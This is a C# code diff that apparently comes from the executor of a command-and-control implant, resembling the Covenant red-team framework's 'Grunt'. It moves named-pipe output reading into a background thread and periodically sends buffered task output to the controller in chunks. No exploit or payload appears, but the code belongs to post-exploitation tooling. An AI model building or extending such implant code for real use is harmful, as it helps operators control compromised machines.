@@ -235,38 +235,53 @@ namespace BruteExecutor
                                     invokeThread.Start();
                                     using (StreamReader reader = new StreamReader(pipeServer))
                                     {
-                                        char[] read = new char[MAX_MESSAGE_SIZE];
-                                        int count;
+                                        object synclock = new object();
                                         string currentRead = "";
-                                        while ((count = reader.Read(read, 0, read.Length)) > 0)
-                                        {
-                                            try
+                                        Thread readThread = new Thread(() => {
+                                            int count;
+                                            char[] read = new char[MAX_MESSAGE_SIZE];
+                                            while ((count = reader.Read(read, 0, read.Length)) > 0)
                                             {
-                                                currentRead += new string(read, 0, count);
-                                                if (currentRead.Length >= MAX_MESSAGE_SIZE)
+                                                lock (synclock)
                                                 {
-                                                    for (int i = 0; i < currentRead.Length; i += MAX_MESSAGE_SIZE)
-                                                    {
-                                                        string aRead = currentRead.Substring(i, Math.Min(MAX_MESSAGE_SIZE, currentRead.Length - i));
-                                                        try
-                                                        {
-                                                            GruntTaskingMessageResponse response = new GruntTaskingMessageResponse(GruntTaskingStatus.Progressed, aRead);
-                                                            messenger.QueueTaskingMessage(response.ToJson(), message.Name);
-                                                        }
-                                                        catch (Exception) {}
-                                                    }
-                                                    currentRead = "";
-                                                    lastTime = DateTime.Now;
-                                                }
-                                                else if (currentRead.Length > 0 && DateTime.Now > (lastTime.Add(TimeSpan.FromSeconds(Delay))))
-                                                {
-                                                    GruntTaskingMessageResponse response = new GruntTaskingMessageResponse(GruntTaskingStatus.Progressed, currentRead);
-                                                    messenger.QueueTaskingMessage(response.ToJson(), message.Name);
-                                                    currentRead = "";
-                                                    lastTime = DateTime.Now;
+                                                    currentRead += new string(read, 0, count);
                                                 }
                                             }
-                                            catch (Exception) { currentRead = "";}
+                                        });
+                                        readThread.Start();
+                                        while (readThread.IsAlive)
+                                        {
+                                            Thread.Sleep(Delay * 1000);
+                                            lock (synclock)
+                                            {
+                                                try
+                                                {
+                                                    if (currentRead.Length >= MAX_MESSAGE_SIZE)
+                                                    {
+                                                        for (int i = 0; i < currentRead.Length; i += MAX_MESSAGE_SIZE)
+                                                        {
+                                                            string aRead = currentRead.Substring(i, Math.Min(MAX_MESSAGE_SIZE, currentRead.Length - i));
+                                                            try
+                                                            {
+                                                                GruntTaskingMessageResponse response = new GruntTaskingMessageResponse(GruntTaskingStatus.Progressed, aRead);
+                                                                messenger.QueueTaskingMessage(response.ToJson(), message.Name);
+                                                            }
+                                                            catch (Exception) {}
+                                                        }
+                                                        currentRead = "";
+                                                        lastTime = DateTime.Now;
+                                                    }
+                                                    else if (currentRead.Length > 0 && DateTime.Now > (lastTime.Add(TimeSpan.FromSeconds(Delay))))
+                                                    {
+                                                        GruntTaskingMessageResponse response = new GruntTaskingMessageResponse(GruntTaskingStatus.Progressed, currentRead);
+                                                        messenger.QueueTaskingMessage(response.ToJson(), message.Name);
+                                                        currentRead = "";
+                                                        lastTime = DateTime.Now;
+                                                    }
+                                                }
+                                                catch (ThreadAbortException) { break; }
+                                                catch (Exception) { currentRead = ""; }
+                                            }
                                         }
                                         output += currentRead;
                                     }
